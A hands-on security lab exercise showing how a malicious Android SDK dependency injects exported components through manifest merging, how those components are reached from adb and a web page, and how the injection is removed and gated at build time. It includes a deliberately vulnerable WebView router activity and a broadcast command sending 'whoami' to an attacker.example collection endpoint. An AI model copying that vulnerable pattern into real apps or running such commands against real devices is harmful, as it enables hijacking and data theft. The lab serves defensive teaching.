# Lab 02 — Manifest merger archaeology

**Difficulty:** Intermediate
**Time:** 2–3 hours
**Chapter:** [08 — The Android Build System](../README.md) §3.10, §5.3.2, §9.2

---

## Objective

Prove, on a real device, that a dependency can add exported components and permissions to an
application whose developers never wrote them — then reach every injected component from a different
security context, then remove them with `tools:` merge markers and prove the fix took effect.

This is the single most productive technique in this chapter. After this lab you will never again
report an app's component surface from `src/main/AndroidManifest.xml`.

---

## Setup

### What you need

- Android Studio or a standalone Gradle + Android SDK installation.
- A device or emulator with `adb` access (API 26+; API 31+ is better, because it makes
  `android:exported` mandatory and you will see that interaction).
- The example files from [`../examples/`](../examples/).

### Build the project

```
lab02/
├── settings.gradle.kts
├── build.gradle.kts
├── gradle/wrapper/...
├── app/
│   ├── build.gradle.kts                        <- ../examples/01-minimal-app-build.gradle.kts
│   └── src/main/
│       ├── AndroidManifest.xml                 <- ../examples/02-host-app-AndroidManifest.xml
│       └── java/com/example/host/
│           ├── App.kt
│           └── MainActivity.kt
└── evil-sdk/
    ├── build.gradle.kts
    └── src/main/
        ├── AndroidManifest.xml                 <- ../examples/02-injecting-sdk-AndroidManifest.xml
        └── java/com/evil/sdk/
            ├── CommandReceiver.kt              <- ../examples/02-CommandReceiver.kt
            ├── RouterActivity.kt
            ├── SdkInitProvider.kt
            └── SyncService.kt
```

`settings.gradle.kts`:

```kotlin
pluginManagement {
    repositories { google(); mavenCentral(); gradlePluginPortal() }
}
dependencyResolutionManagement {
    repositories { google(); mavenCentral() }
}
rootProject.name = "lab02"
include(":app", ":evil-sdk")
```

In `app/build.gradle.kts`, set `namespace` and `applicationId` to `com.example.host` and add:

```kotlin
dependencies {
    implementation(project(":evil-sdk"))
}
```

Write minimal stubs for `RouterActivity`, `SdkInitProvider` and `SyncService` — they only need to
compile and log. `RouterActivity` should deliberately be naive, because that is what real router
activities are:

```kotlin
// evil-sdk/src/main/java/com/evil/sdk/RouterActivity.kt
package com.evil.sdk

import android.app.Activity
import android.os.Bundle
import android.util.Log
import android.webkit.WebView

class RouterActivity : Activity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        // The classic intent-redirection shape: a URL from an attacker-supplied
        // extra or deep link, loaded without validation, inside the HOST app's
        // origin and with the HOST app's cookies.
        val url = intent?.data?.getQueryParameter("url")
            ?: intent?.getStringExtra("url")
        Log.w("EvilSDK", "RouterActivity loading: $url")
        val wv = WebView(this)
        wv.settings.javaScriptEnabled = true
        setContentView(wv)
        if (url != null) wv.loadUrl(url)
    }
}
```

---

## Part A — Observe the injection

### A1. Comment out every `tools:` attribute in the host manifest

Open `app/src/main/AndroidManifest.xml` and comment out every element that carries a `tools:` attribute.
The host manifest should now declare exactly one component: `MainActivity`.

### A2. Build and diff

```bash
# host
./gradlew :app:assembleDebug

echo "=== what the developer wrote ==="
grep -c "android:name=" app/src/main/AndroidManifest.xml

echo "=== what shipped ==="
find app/build/intermediates -name AndroidManifest.xml -path "*erged*" -exec cat {} \;
```

**Record:** the component count before and after.

### A3. Attribute every addition

```bash
# host
cat app/build/outputs/logs/manifest-merger-debug-report.txt

python3 ../scripts/manifest-merge-diff.py \
  --source app/src/main/AndroidManifest.xml \
  --merged app/build/intermediates/merged_manifests/debug/AndroidManifest.xml \
  --report app/build/outputs/logs/manifest-merger-debug-report.txt \
  --emit-am-commands
```

**Record:** each added element, and the `ADDED from [...]` line that names its source.

> **Hint.** The exact path under `intermediates/` varies by AGP version. If the `find` above returns
> nothing, use `find app/build -name "AndroidManifest.xml" | grep -i merge`.

---

## Part B — Reach the injected components

Install and attack the app **from adb**, which is a different UID and therefore a genuinely different
security context.

```bash
# host
adb install -r app/build/outputs/apk/debug/app-debug.apk
adb logcat -c
```

### B1. The receiver

```bash
# adb shell
am broadcast -a com.evil.sdk.EXECUTE \
   -n com.example.host/com.evil.sdk.CommandReceiver \
   --es cmd "whoami" --es endpoint "https://attacker.example/collect"
```

```bash
# host
adb logcat -d -s EvilSDK
```

**Record:** the `host uid`, `my uid` and `data dir` values in the log. They belong to
`com.example.host`, and the code that printed them shipped in a dependency.

### B2. The browsable activity, from the command line

```bash
# adb shell
am start -a android.intent.action.VIEW \
   -d "evilsdk://open?url=https://example.org/"
```

### B3. The browsable activity, from a web page

This is the step that makes the finding real to a client, because it needs no adb at all.

```bash
# host — serve a page from your machine
mkdir -p /tmp/lab02 && cat > /tmp/lab02/index.html <<'EOF'
<!doctype html>
<meta name="viewport" content="width=device-width,initial-scale=1">
<h1>Lab 02</h1>
<p><a href="evilsdk://open?url=https://example.org/">Continue in the app</a></p>
EOF
python3 -m http.server 8000 --directory /tmp/lab02
```

```bash
# adb shell — open the page in the device browser, then tap the link
am start -a android.intent.action.VIEW -d "http://10.0.2.2:8000/"   # emulator
# or your host's LAN IP for a physical device
```

**Record:** that a link on an arbitrary web page launched a component inside the host app.

### B4. The service and the provider

```bash
# adb shell
am startservice -n com.example.host/com.evil.sdk.SyncService
content query --uri content://com.example.host.evilsdk-init/
```

**Record:** which succeed and which fail, and why. The provider is `exported="false"`, so it must be
refused — confirming that the attribute, not the presence of the component, is what matters.

---

## Part C — Fix it, and prove the fix

### C1. Restore the `tools:` markers

Uncomment everything in `app/src/main/AndroidManifest.xml`. Rebuild.

```bash
# host
./gradlew :app:assembleDebug
adb install -r app/build/outputs/apk/debug/app-debug.apk
```

### C2. Re-run every command from Part B

```bash
# adb shell
am broadcast -a com.evil.sdk.EXECUTE -n com.example.host/com.evil.sdk.CommandReceiver
# Expect: Error type 3 / component does not exist

am start -a android.intent.action.VIEW -d "evilsdk://open?url=https://example.org/"
# Expect: no activity found to handle Intent

am startservice -n com.example.host/com.evil.sdk.SyncService
# Expect: failure
```

### C3. Confirm in the merged manifest and the report

```bash
# host
python3 ../scripts/manifest-merge-diff.py \
  --source app/src/main/AndroidManifest.xml \
  --merged app/build/intermediates/merged_manifests/debug/AndroidManifest.xml

grep -n "REJECTED\|REMOVED\|tools:node" app/build/outputs/logs/manifest-merger-debug-report.txt
```

### C4. Prove the code is still present

This is the part people skip, and it is the point of the warning in §3.10.

```bash
# host
unzip -o app/build/outputs/apk/debug/app-debug.apk 'classes*.dex' -d /tmp/lab02dex
strings -n 8 /tmp/lab02dex/*.dex | grep -i "evil.sdk" | sort -u
```

**Record:** `com.evil.sdk.CommandReceiver` is still in the DEX. `tools:node="remove"` removed the
*manifest element*, not the code. If the SDK's own initialisation had called into that component, the
app would now crash.

---

## Part D — Make it a build-time invariant

Apply [`../examples/03-SecurityGatePlugin.kt`](../examples/03-SecurityGatePlugin.kt) to the app module,
with `ALLOWED_EXPORTED = setOf("com.example.host.MainActivity")`.

```bash
# host
# 1. Remove the tools: markers again.
./gradlew :app:assembleRelease
# Expect the build to FAIL, naming each injected component.

# 2. Restore the markers.
./gradlew :app:assembleRelease
# Expect: "Security gate passed: 1 exported components, N permissions — all reviewed."
```

**Record:** the exact failure message. This is the deliverable you give a client — the remediation that
stops the problem recurring, rather than the one that fixes today's instance.

---

## Success criteria

- [ ] You can state the component count before and after merging, from your own build.
- [ ] You produced the `ADDED from [...]` provenance line for at least four injected elements.
- [ ] You reached the injected receiver from `adb` and captured the host app's UID in logcat.
- [ ] You launched the injected activity **from a web page**, with no adb involvement.
- [ ] You explained why the `exported="false"` provider could not be reached.
- [ ] You removed the components with `tools:` markers and demonstrated the commands now fail.
- [ ] You demonstrated that the SDK's **code is still in the DEX** after removal.
- [ ] The security gate fails the build when the markers are absent and passes when they are present.

---

## Discussion questions

1. `tools:node="remove"` fixed the manifest. Why is "remove or replace the SDK" still the better
   long-term answer?
2. The provider was `exported="false"` and unreachable — but its `onCreate` still runs on every app
   launch, before `Application.onCreate`. What does a dependency gain from that, and what is the
   security consequence?
3. On API 31+, `android:exported` is mandatory for any component with an intent filter. Does that fix
   this problem? (It does not. Explain precisely why: whose manifest declares the attribute?)
4. You find forty injected components on a client's app. How do you decide which three go in the
   report? Use the severity table in [§5.3.2](../README.md#532-an-sdk-injected-exported-component).
